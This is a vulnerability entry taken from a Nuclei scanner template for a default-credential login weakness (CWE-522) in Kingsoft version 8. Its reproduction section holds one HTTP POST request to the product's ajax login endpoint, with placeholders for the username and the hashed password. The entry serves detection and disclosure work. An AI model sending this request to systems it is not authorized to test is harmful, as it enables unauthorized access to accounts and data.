# Nuclei Template: Kingsoft 8 - Default Login
**Template ID:** kingsoft-v8-default-login
**Vulnerability Class:** Insufficiently Protected Credentials
**Severity:** High
**CWE:** CWE-522
**Source:** Nuclei Template (`kingsoft-v8-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Kingsoft version 8 contains a default login vulnerability. An attacker can obtain access to user accounts and access sensitive information, modify data, and/or execute unauthorized operations.

## Steps to reproduce / Exploit Payload
```http
POST /inter/ajax.php?cmd=get_user_login_cmd HTTP/1.1
Host: {{Hostname}}

{"get_user_login_cmd":{"name":"{{username}}","password":"{{md5(password)}}"}}
```

## References
- https://idc.wanyunshuju.com/aqld/2123.html
